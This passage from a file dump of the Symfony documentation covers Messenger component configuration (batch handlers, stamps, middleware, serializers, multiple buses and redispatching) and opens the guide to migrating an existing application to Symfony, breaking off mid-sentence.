<framework:routing message-class=\"App\\Message\\UploadedImage\">\n                        <framework:sender service=\"image_transport\"/>\n                        <framework:sender service=\"async_priority_normal\"/>\n                    </framework:routing>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/messenger.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $messenger = $framework->messenger();\n\n            $messenger->transport('async_priority_normal')->dsn('...');\n            $messenger->transport('image_transport')->dsn('...');\n\n            $messenger->routing('App\\Message\\UploadedImage')\n                ->senders(['image_transport', 'async_priority_normal']);\n        };\n\nThat's it! You can now consume each transport:\n\n.. code-block:: terminal\n\n    # will only call ThumbnailUploadedImageHandler when handling the message\n    $ php bin/console messenger:consume image_transport -vv\n\n    $ php bin/console messenger:consume async_priority_normal -vv\n\n.. warning::\n\n    If a handler does *not* have ``from_transport`` config, it will be executed\n    on *every* transport that the message is received from.\n\nProcess Messages by Batches\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nYou can declare \"special\" handlers which will process messages by batch.\nBy doing so, the handler will wait for a certain amount of messages to be\npending before processing them. The declaration of a batch handler is done\nby implementing\n:class:`Symfony\\\\Component\\\\Messenger\\\\Handler\\\\BatchHandlerInterface`. The\n:class:`Symfony\\\\Component\\\\Messenger\\\\Handler\\\\BatchHandlerTrait` is also\nprovided in order to ease the declaration of these special handlers::\n\n    use Symfony\\Component\\Messenger\\Handler\\Acknowledger;\n    use Symfony\\Component\\Messenger\\Handler\\BatchHandlerInterface;\n    use Symfony\\Component\\Messenger\\Handler\\BatchHandlerTrait;\n\n    class MyBatchHandler implements BatchHandlerInterface\n    {\n        use BatchHandlerTrait;\n\n        public function __invoke(MyMessage $message, ?Acknowledger $ack = null): mixed\n        {\n            return $this->handle($message, $ack);\n        }\n\n        private function process(array $jobs): void\n        {\n            foreach ($jobs as [$message, $ack]) {\n                try {\n                    // Compute $result from $message...\n\n                    // Acknowledge the processing of the message\n                    $ack->ack($result);\n                } catch (\\Throwable $e) {\n                    $ack->nack($e);\n                }\n            }\n        }\n\n        // Optionally, you can override some of the trait methods, such as the\n        // `getBatchSize()` method, to specify your own batch size...\n        private function getBatchSize(): int\n        {\n            return 100;\n        }\n    }\n\n.. note::\n\n    When the ``$ack`` argument of ``__invoke()`` is ``null``, the message is\n    expected to be handled synchronously. Otherwise, ``__invoke()`` is\n    expected to return the number of pending messages. The\n    :class:`Symfony\\\\Component\\\\Messenger\\\\Handler\\\\BatchHandlerTrait` handles\n    this for you.\n\n.. note::\n\n    By default, pending batches are flushed when the worker is idle as well\n    as when it is stopped.\n\nExtending Messenger\n-------------------\n\nEnvelopes & Stamps\n~~~~~~~~~~~~~~~~~~\n\nA message can be any PHP object. Sometimes, you may need to configure something\nextra about the message - like the way it should be handled inside AMQP or adding\na delay before the message should be handled. You can do that by adding a \"stamp\"\nto your message::\n\n    use Symfony\\Component\\Messenger\\Envelope;\n    use Symfony\\Component\\Messenger\\MessageBusInterface;\n    use Symfony\\Component\\Messenger\\Stamp\\DelayStamp;\n\n    public function index(MessageBusInterface $bus): void\n    {\n        // wait 5 seconds before processing\n        $bus->dispatch(new SmsNotification('...'), [\n            new DelayStamp(5000),\n        ]);\n\n        // or explicitly create an Envelope\n        $bus->dispatch(new Envelope(new SmsNotification('...'), [\n            new DelayStamp(5000),\n        ]));\n\n        // ...\n    }\n\nInternally, each message is wrapped in an ``Envelope``, which holds the message\nand stamps. You can create this manually or allow the message bus to do it. There\nare a variety of different stamps for different purposes and they're used internally\nto track information about a message - like the message bus that's handling it\nor if it's being retried after failure.\n\n.. _messenger_middleware:\n\nMiddleware\n~~~~~~~~~~\n\nWhat happens when you dispatch a message to a message bus depends on its\ncollection of middleware and their order. By default, the middleware configured\nfor each bus looks like this:\n\n#. ``add_bus_name_stamp_middleware`` - adds a stamp to record which bus this\n   message was dispatched into;\n\n#. ``dispatch_after_current_bus``- see :ref:`messenger-transactional-messages`;\n\n#. ``failed_message_processing_middleware`` - processes messages that are being\n   retried via the :ref:`failure transport <messenger-failure-transport>` to make\n   them properly function as if they were being received from their original transport;\n\n#. Your own collection of middleware_;\n\n#. ``send_message`` - if routing is configured for the transport, this sends\n   messages to that transport and stops the middleware chain;\n\n#. ``handle_message`` - calls the message handler(s) for the given message.\n\n.. note::\n\n    These middleware names are actually shortcut names. The real service ids\n    are prefixed with ``messenger.middleware.`` (e.g. ``messenger.middleware.handle_message``).\n\nThe middleware are executed when the message is dispatched but *also* again when\na message is received via the worker (for messages that were sent to a transport\nto be handled asynchronously). Keep this in mind if you create your own middleware.\n\nYou can add your own middleware to this list, or completely disable the default\nmiddleware and *only* include your own.\n\nIf a middleware service is abstract, you can configure its constructor's arguments\nand a different instance will be created per bus.\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/messenger.yaml\n        framework:\n            messenger:\n                buses:\n                    messenger.bus.default:\n                        # disable the default middleware\n                        default_middleware: false\n\n                        middleware:\n                            # use and configure parts of the default middleware you want\n                            - 'add_bus_name_stamp_middleware': ['messenger.bus.default']\n\n                            # add your own services that implement Symfony\\Component\\Messenger\\Middleware\\MiddlewareInterface\n                            - 'App\\Middleware\\MyMiddleware'\n                            - 'App\\Middleware\\AnotherMiddleware'\n\n    .. code-block:: xml\n\n        <!-- config/packages/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:messenger>\n                    <!-- default-middleware: disable the default middleware -->\n                    <framework:bus name=\"messenger.bus.default\" default-middleware=\"false\">\n\n                        <!-- use and configure parts of the default middleware you want -->\n                        <framework:middleware id=\"add_bus_name_stamp_middleware\">\n                            <framework:argument>messenger.bus.default</framework:argument>\n                        </framework:middleware>\n\n                        <!-- add your own services that implement Symfony\\Component\\Messenger\\Middleware\\MiddlewareInterface -->\n                        <framework:middleware id=\"App\\Middleware\\MyMiddleware\"/>\n                        <framework:middleware id=\"App\\Middleware\\AnotherMiddleware\"/>\n                    </framework:bus>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/messenger.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $messenger = $framework->messenger();\n\n            $bus = $messenger->bus('messenger.bus.default')\n                ->defaultMiddleware(false); // disable the default middleware\n\n            // use and configure parts of the default middleware you want\n            $bus->middleware()->id('add_bus_name_stamp_middleware')->arguments(['messenger.bus.default']);\n\n            // add your own services that implement Symfony\\Component\\Messenger\\Middleware\\MiddlewareInterface\n            $bus->middleware()->id('App\\Middleware\\MyMiddleware');\n            $bus->middleware()->id('App\\Middleware\\AnotherMiddleware');\n        };\n\n.. _middleware-doctrine:\n\nMiddleware for Doctrine\n~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you use Doctrine in your app, a number of optional middleware exist that you\nmay want to use:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/messenger.yaml\n        framework:\n            messenger:\n                buses:\n                    command_bus:\n                        middleware:\n                            # each time a message is handled, the Doctrine connection\n                            # is \"pinged\" and reconnected if it's closed. Useful\n                            # if your workers run for a long time and the database\n                            # connection is sometimes lost\n                            - doctrine_ping_connection\n\n                            # After handling, the Doctrine connection is closed,\n                            # which can free up database connections in a worker,\n                            # instead of keeping them open forever\n                            - doctrine_close_connection\n\n                            # logs an error when a Doctrine transaction was opened but not closed\n                            - doctrine_open_transaction_logger\n\n                            # wraps all handlers in a single Doctrine transaction\n                            # handlers do not need to call flush() and an error\n                            # in any handler will cause a rollback\n                            - doctrine_transaction\n\n                            # or pass a different entity manager to any\n                            #- doctrine_transaction: ['custom']\n\n    .. code-block:: xml\n\n        <!-- config/packages/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:messenger>\n                    <framework:bus name=\"command_bus\">\n                        <framework:middleware id=\"doctrine_transaction\"/>\n                        <framework:middleware id=\"doctrine_ping_connection\"/>\n                        <framework:middleware id=\"doctrine_close_connection\"/>\n                        <framework:middleware id=\"doctrine_open_transaction_logger\"/>\n\n                        <!-- or pass a different entity manager to any -->\n                        <!--\n                        <framework:middleware id=\"doctrine_transaction\">\n                            <framework:argument>custom</framework:argument>\n                        </framework:middleware>\n                        -->\n                    </framework:bus>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/messenger.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $messenger = $framework->messenger();\n\n            $bus = $messenger->bus('command_bus');\n            $bus->middleware()->id('doctrine_transaction');\n            $bus->middleware()->id('doctrine_ping_connection');\n            $bus->middleware()->id('doctrine_close_connection');\n            $bus->middleware()->id('doctrine_open_transaction_logger');\n            // Using another entity manager\n            $bus->middleware()->id('doctrine_transaction')\n                ->arguments(['custom']);\n        };\n\nOther Middlewares\n~~~~~~~~~~~~~~~~~\n\nAdd the ``router_context`` middleware if you need to generate absolute URLs in\nthe consumer (e.g. render a template with links). This middleware stores the\noriginal request context (i.e. the host, the HTTP port, etc.) which is needed\nwhen building absolute URLs.\n\nAdd the ``validation`` middleware if you need to validate the message\nobject using the :doc:`Validator component </components/validator>` before handling it.\nIf validation fails, a ``ValidationFailedException`` will be thrown. The\n:class:`Symfony\\\\Component\\\\Messenger\\\\Stamp\\\\ValidationStamp` can be used\nto configure the validation groups.\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/messenger.yaml\n        framework:\n            messenger:\n                buses:\n                    command_bus:\n                        middleware:\n                            - router_context\n                            - validation\n\n    .. code-block:: xml\n\n        <!-- config/packages/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:messenger>\n                    <framework:bus name=\"command_bus\">\n                        <framework:middleware id=\"router_context\"/>\n                        <framework:middleware id=\"validation\"/>\n                    </framework:bus>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/messenger.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $messenger = $framework->messenger();\n\n            $bus = $messenger->bus('command_bus');\n            $bus->middleware()->id('router_context');\n            $bus->middleware()->id('validation');\n        };\n\nMessenger Events\n~~~~~~~~~~~~~~~~\n\nIn addition to middleware, Messenger also dispatches several events. You can\n:doc:`create an event listener </event_dispatcher>` to hook into various parts\nof the process. For each, the event class is the event name:\n\n* :class:`Symfony\\\\Component\\\\Messenger\\\\Event\\\\SendMessageToTransportsEvent`\n* :class:`Symfony\\\\Component\\\\Messenger\\\\Event\\\\WorkerMessageFailedEvent`\n* :class:`Symfony\\\\Component\\\\Messenger\\\\Event\\\\WorkerMessageHandledEvent`\n* :class:`Symfony\\\\Component\\\\Messenger\\\\Event\\\\WorkerMessageReceivedEvent`\n* :class:`Symfony\\\\Component\\\\Messenger\\\\Event\\\\WorkerMessageRetriedEvent`\n* :class:`Symfony\\\\Component\\\\Messenger\\\\Event\\\\WorkerRateLimitedEvent`\n* :class:`Symfony\\\\Component\\\\Messenger\\\\Event\\\\WorkerRunningEvent`\n* :class:`Symfony\\\\Component\\\\Messenger\\\\Event\\\\WorkerStartedEvent`\n* :class:`Symfony\\\\Component\\\\Messenger\\\\Event\\\\WorkerStoppedEvent`\n\nAdditional Handler Arguments\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIt's possible to have messenger pass additional data to the message handler\nusing the :class:`Symfony\\\\Component\\\\Messenger\\\\Stamp\\\\HandlerArgumentsStamp`.\nAdd this stamp to the envelope in a middleware and fill it with any additional\ndata you want to have available in the handler::\n\n    // src/Messenger/AdditionalArgumentMiddleware.php\n    namespace App\\Messenger;\n\n    use Symfony\\Component\\Messenger\\Envelope;\n    use Symfony\\Component\\Messenger\\Middleware\\MiddlewareInterface;\n    use Symfony\\Component\\Messenger\\Middleware\\StackInterface;\n    use Symfony\\Component\\Messenger\\Stamp\\HandlerArgumentsStamp;\n\n    final class AdditionalArgumentMiddleware implements MiddlewareInterface\n    {\n        public function handle(Envelope $envelope, StackInterface $stack): Envelope\n        {\n            $envelope = $envelope->with(new HandlerArgumentsStamp([\n                $this->resolveAdditionalArgument($envelope->getMessage()),\n            ]));\n\n            return $stack->next()->handle($envelope, $stack);\n        }\n\n        private function resolveAdditionalArgument(object $message): mixed\n        {\n            // ...\n        }\n    }\n\nThen your handler will look like this::\n\n    // src/MessageHandler/SmsNotificationHandler.php\n    namespace App\\MessageHandler;\n\n    use App\\Message\\SmsNotification;\n\n    final class SmsNotificationHandler\n    {\n        public function __invoke(SmsNotification $message, mixed $additionalArgument)\n        {\n            // ...\n        }\n    }\n\nMessage Serializer For Custom Data Formats\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you receive messages from other applications, it's possible that they are not\nexactly in the format you need. Not all applications will return a JSON message\nwith ``body`` and ``headers`` fields. In those cases, you'll need to create a\nnew message serializer implementing the\n:class:`Symfony\\\\Component\\\\Messenger\\\\Transport\\\\Serialization\\\\SerializerInterface`.\nLet's say you want to create a message decoder::\n\n    namespace App\\Messenger\\Serializer;\n\n    use Symfony\\Component\\Messenger\\Envelope;\n    use Symfony\\Component\\Messenger\\Transport\\Serialization\\SerializerInterface;\n\n    class MessageWithTokenDecoder implements SerializerInterface\n    {\n        public function decode(array $encodedEnvelope): Envelope\n        {\n            try {\n                // parse the data you received with your custom fields\n                $data = $encodedEnvelope['data'];\n                $data['token'] = $encodedEnvelope['token'];\n\n                // other operations like getting information from stamps\n            } catch (\\Throwable $throwable) {\n                // wrap any exception that may occur in the envelope to send it to the failure transport\n                return new Envelope($throwable);\n            }\n\n            return new Envelope($data);\n        }\n\n        public function encode(Envelope $envelope): array\n        {\n            // this decoder does not encode messages, but you can implement it by returning\n            // an array with serialized stamps if you need to send messages in a custom format\n            throw new \\LogicException('This serializer is only used for decoding messages.');\n        }\n    }\n\nThe next step is to tell Symfony to use this serializer in one or more of your\ntransports:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/messenger.yaml\n        framework:\n            messenger:\n                transports:\n                    my_transport:\n                        dsn: '%env(MY_TRANSPORT_DSN)%'\n                        serializer: 'App\\Messenger\\Serializer\\MessageWithTokenDecoder'\n\n    .. code-block:: xml\n\n        <!-- config/packages/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:messenger>\n                    <framework:transport name=\"my_transport\" dsn=\"%env(MY_TRANSPORT_DSN)%\" serializer=\"App\\Messenger\\Serializer\\MessageWithTokenDecoder\">\n                        <!-- ... -->\n                    </framework:transport>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/messenger.php\n        use App\\Messenger\\Serializer\\MessageWithTokenDecoder;\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $messenger = $framework->messenger();\n\n            $messenger->transport('my_transport')\n                ->dsn('%env(MY_TRANSPORT_DSN)%')\n                ->serializer(MessageWithTokenDecoder::class);\n        };\n\n.. _messenger-multiple-buses:\n\nMultiple Buses, Command & Event Buses\n-------------------------------------\n\nMessenger gives you a single message bus service by default. But, you can configure\nas many as you want, creating \"command\", \"query\" or \"event\" buses and controlling\ntheir middleware.\n\nA common architecture when building applications is to separate commands from\nqueries. Commands are actions that do something and queries fetch data. This\nis called CQRS (Command Query Responsibility Segregation). See Martin Fowler's\n`article about CQRS`_ to learn more. This architecture could be used together\nwith the Messenger component by defining multiple buses.\n\nA **command bus** is a little different from a **query bus**. For example, command\nbuses usually don't provide any results and query buses are rarely asynchronous.\nYou can configure these buses and their rules by using middleware.\n\nIt might also be a good idea to separate actions from reactions by introducing\nan **event bus**. The event bus could have zero or more subscribers.\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        framework:\n            messenger:\n                # The bus that is going to be injected when injecting MessageBusInterface\n                default_bus: command.bus\n                buses:\n                    command.bus:\n                        middleware:\n                            - validation\n                            - doctrine_transaction\n                    query.bus:\n                        middleware:\n                            - validation\n                    event.bus:\n                        default_middleware:\n                            enabled: true\n                            # set \"allow_no_handlers\" to true (default is false) to allow having\n                            # no handler configured for this bus without throwing an exception\n                            allow_no_handlers: false\n                            # set \"allow_no_senders\" to false (default is true) to throw an exception\n                            # if no sender is configured for this bus\n                            allow_no_senders: true\n                        middleware:\n                            - validation\n\n    .. code-block:: xml\n\n        <!-- config/packages/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <!-- The bus that is going to be injected when injecting MessageBusInterface -->\n                <framework:messenger default-bus=\"command.bus\">\n                    <framework:bus name=\"command.bus\">\n                        <framework:middleware id=\"validation\"/>\n                        <framework:middleware id=\"doctrine_transaction\"/>\n                    </framework:bus>\n                    <framework:bus name=\"query.bus\">\n                        <framework:middleware id=\"validation\"/>\n                    </framework:bus>\n                    <framework:bus name=\"event.bus\">\n                        <!-- set \"allow-no-handlers\" to true (default is false) to allow having\n                              no handler configured for this bus without throwing an exception -->\n                        <!-- set \"allow-no-senders\" to false (default is true) to throw an exception\n                             if no sender is configured for this bus -->\n                        <framework:default-middleware enabled=\"true\" allow-no-handlers=\"false\" allow-no-senders=\"true\"/>\n                        <framework:middleware id=\"validation\"/>\n                    </framework:bus>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/messenger.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            // The bus that is going to be injected when injecting MessageBusInterface\n            $framework->messenger()->defaultBus('command.bus');\n\n            $commandBus = $framework->messenger()->bus('command.bus');\n            $commandBus->middleware()->id('validation');\n            $commandBus->middleware()->id('doctrine_transaction');\n\n            $queryBus = $framework->messenger()->bus('query.bus');\n            $queryBus->middleware()->id('validation');\n\n            $eventBus = $framework->messenger()->bus('event.bus');\n            $eventBus->defaultMiddleware()\n                ->enabled(true)\n                // set \"allowNoHandlers\" to true (default is false) to allow having\n                // no handler configured for this bus without throwing an exception\n                ->allowNoHandlers(false)\n                // set \"allowNoSenders\" to false (default is true) to throw an exception\n                // if no sender is configured for this bus\n                ->allowNoSenders(true)\n            ;\n            $eventBus->middleware()->id('validation');\n        };\n\nThis will create three new services:\n\n* ``command.bus``: autowireable with the :class:`Symfony\\\\Component\\\\Messenger\\\\MessageBusInterface`\n  type-hint (because this is the ``default_bus``);\n\n* ``query.bus``: autowireable with ``MessageBusInterface $queryBus``;\n\n* ``event.bus``: autowireable with ``MessageBusInterface $eventBus``.\n\nRestrict Handlers per Bus\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\nBy default, each handler will be available to handle messages on *all*\nof your buses. To prevent dispatching a message to the wrong bus without an error,\nyou can restrict each handler to a specific bus using the ``messenger.message_handler`` tag:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            App\\MessageHandler\\SomeCommandHandler:\n                tags: [{ name: messenger.message_handler, bus: command.bus }]\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <service id=\"App\\MessageHandler\\SomeCommandHandler\">\n                    <tag name=\"messenger.message_handler\" bus=\"command.bus\"/>\n                </service>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        $container->services()\n            ->set(App\\MessageHandler\\SomeCommandHandler::class)\n            ->tag('messenger.message_handler', ['bus' => 'command.bus']);\n\nThis way, the ``App\\MessageHandler\\SomeCommandHandler`` handler will only be\nknown by the ``command.bus`` bus.\n\nYou can also automatically add this tag to a number of classes by using\nthe :ref:`_instanceof service configuration <di-instanceof>`. Using this,\nyou can determine the message bus based on an implemented interface:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            # ...\n\n            _instanceof:\n                # all services implementing the CommandHandlerInterface\n                # will be registered on the command.bus bus\n                App\\MessageHandler\\CommandHandlerInterface:\n                    tags:\n                        - { name: messenger.message_handler, bus: command.bus }\n\n                # while those implementing QueryHandlerInterface will be\n                # registered on the query.bus bus\n                App\\MessageHandler\\QueryHandlerInterface:\n                    tags:\n                        - { name: messenger.message_handler, bus: query.bus }\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <!-- ... -->\n\n                <!-- all services implementing the CommandHandlerInterface\n                     will be registered on the command.bus bus -->\n                <instanceof id=\"App\\MessageHandler\\CommandHandlerInterface\">\n                    <tag name=\"messenger.message_handler\" bus=\"command.bus\"/>\n                </instanceof>\n\n                <!-- while those implementing QueryHandlerInterface will be\n                     registered on the query.bus bus -->\n                <instanceof id=\"App\\MessageHandler\\QueryHandlerInterface\">\n                    <tag name=\"messenger.message_handler\" bus=\"query.bus\"/>\n                </instanceof>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use App\\MessageHandler\\CommandHandlerInterface;\n        use App\\MessageHandler\\QueryHandlerInterface;\n\n        return function(ContainerConfigurator $container): void {\n            $services = $container->services();\n\n            // ...\n\n            // all services implementing the CommandHandlerInterface\n            // will be registered on the command.bus bus\n            $services->instanceof(CommandHandlerInterface::class)\n                ->tag('messenger.message_handler', ['bus' => 'command.bus']);\n\n            // while those implementing QueryHandlerInterface will be\n            // registered on the query.bus bus\n            $services->instanceof(QueryHandlerInterface::class)\n                ->tag('messenger.message_handler', ['bus' => 'query.bus']);\n        };\n\nDebugging the Buses\n~~~~~~~~~~~~~~~~~~~\n\nThe ``debug:messenger`` command lists available messages & handlers per bus.\nYou can also restrict the list to a specific bus by providing its name as an argument.\n\n.. code-block:: terminal\n\n    $ php bin/console debug:messenger\n\n      Messenger\n      =========\n\n      command.bus\n      -----------\n\n       The following messages can be dispatched:\n\n       ---------------------------------------------------------------------------------------\n        App\\Message\\DummyCommand\n            handled by App\\MessageHandler\\DummyCommandHandler\n        App\\Message\\MultipleBusesMessage\n            handled by App\\MessageHandler\\MultipleBusesMessageHandler\n       ---------------------------------------------------------------------------------------\n\n      query.bus\n      ---------\n\n       The following messages can be dispatched:\n\n       ---------------------------------------------------------------------------------------\n        App\\Message\\DummyQuery\n            handled by App\\MessageHandler\\DummyQueryHandler\n        App\\Message\\MultipleBusesMessage\n            handled by App\\MessageHandler\\MultipleBusesMessageHandler\n       ---------------------------------------------------------------------------------------\n\n.. tip::\n\n    The command will also show the PHPDoc description of the message and handler classes.\n\nRedispatching a Message\n-----------------------\n\nIf you want to redispatch a message (using the same transport and envelope), create\na new :class:`Symfony\\\\Component\\\\Messenger\\\\Message\\\\RedispatchMessage` and dispatch\nit through your bus. Reusing the same ``SmsNotification`` example shown earlier::\n\n    // src/MessageHandler/SmsNotificationHandler.php\n    namespace App\\MessageHandler;\n\n    use App\\Message\\SmsNotification;\n    use Symfony\\Component\\Messenger\\Attribute\\AsMessageHandler;\n    use Symfony\\Component\\Messenger\\Message\\RedispatchMessage;\n    use Symfony\\Component\\Messenger\\MessageBusInterface;\n\n    #[AsMessageHandler]\n    class SmsNotificationHandler\n    {\n        public function __construct(private MessageBusInterface $bus)\n        {\n        }\n\n        public function __invoke(SmsNotification $message): void\n        {\n            // do something with the message\n            // then redispatch it based on your own logic\n\n            if ($needsRedispatch) {\n                $this->bus->dispatch(new RedispatchMessage($message));\n            }\n        }\n    }\n\nThe built-in :class:`Symfony\\\\Component\\\\Messenger\\\\Handler\\\\RedispatchMessageHandler`\nwill take care of this message to redispatch it through the same bus it was\ndispatched at first. You can also use the second argument of the ``RedispatchMessage``\nconstructor to provide transports to use when redispatching the message.\n\nLearn more\n----------\n\n.. toctree::\n    :maxdepth: 1\n    :glob:\n\n    /messenger/*\n\n.. _`Enqueue's transport`: https://github.com/sroze/messenger-enqueue-transport\n.. _`streams`: https://redis.io/topics/streams-intro\n.. _`Supervisor docs`: http://supervisord.org/\n.. _`PCNTL`: https://www.php.net/manual/book.pcntl.php\n.. _`systemd docs`: https://systemd.io/\n.. _`SymfonyCasts' message serializer tutorial`: https://symfonycasts.com/screencast/messenger/transport-serializer\n.. _`Long polling`: https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-short-and-long-polling.html\n.. _`Visibility Timeout`: https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-visibility-timeout.html\n.. _`FIFO queue`: https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/FIFO-queues.html\n.. _`LISTEN/NOTIFY`: https://www.postgresql.org/docs/current/sql-notify.html\n.. _`AMQProxy`: https://github.com/cloudamqp/amqproxy\n.. _`high connection churn`: https://www.rabbitmq.com/connections.html#high-connection-churn\n.. _`article about CQRS`: https://martinfowler.com/bliki/CQRS.html\n.. _`SSL context options`: https://php.net/context.ssl\n"
        },
        {
          "name": "messenger",
          "type": "tree",
          "content": null
        },
        {
          "name": "migration.rst",
          "type": "blob",
          "size": 21.9052734375,
          "content": "Migrating an Existing Application to Symfony\n============================================\n\nWhen you have an existing application that was not built with Symfony,\nyou might want to move over parts of that application without rewriting\nthe existing logic completely. For those cases there is a pattern called\n`Strangler Fig Application`_. The basic idea of this pattern is to create a\nnew application that gradually takes over functionality from an existing\napplication. This migration approach can be implemented with Symfony in\nvarious ways and has some benefits over a rewrite such as being able\nto introduce new features in the existing application and reducing risk\nby avoiding a \"big bang\"-release for the new application.\n\n.. admonition:: Screencast\n    :class: screencast\n\n    The topic of migrating from an existing application towards Symfony is\n    sometimes discussed during conferences. For example the talk\n    `Modernizing with Symfony`_ reiterates some of the points from this page.\n\nPrerequisites\n-------------\n\nBefore you start introducing Symfony to the existing application, you have to\nensure certain requirements are met by your existing application and\nenvironment.  Making the decisions and preparing the environment before\nstarting the migration process is crucial for its success.\n\n.. note::\n\n    The following steps do not require you to have the new Symfony\n    application in place and in fact it might be safer to introduce these\n    changes beforehand in your existing application.\n\nChoosing the Target Symfony Version\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nMost importantly, this means that you will have to decide which version you\nare aiming to migrate to, either a current stable release or the long\nterm support version (LTS). The main difference is, how frequently you\nwill need to upgrade in order to use a supported version. In the context\nof a migration, other factors, such as the supported PHP-version or\nsupport for libraries/bundles you use, may have a strong impact as well.\nUsing the most recent, stable release will likely give you more features,\nbut it will also require you to update more frequently to ensure you will\nget support for bug fixes and security patches and you will have to work\nfaster on fixing deprecations to be able to upgrade.\n\n.. tip::\n\n    When upgrading to Symfony you might be tempted to also use\n    :ref:`Flex <symfony-flex>`. Please keep in mind that it primarily\n    focuses on bootstrapping a new Symfony application according to best\n    practices regarding the directory structure. When you work in the\n    constraints of an existing application you might not be able to\n    follow these constraints, making Flex less useful.\n\nFirst of all your environment needs to be able to support the minimum\nrequirements for both applications. In other words, when the 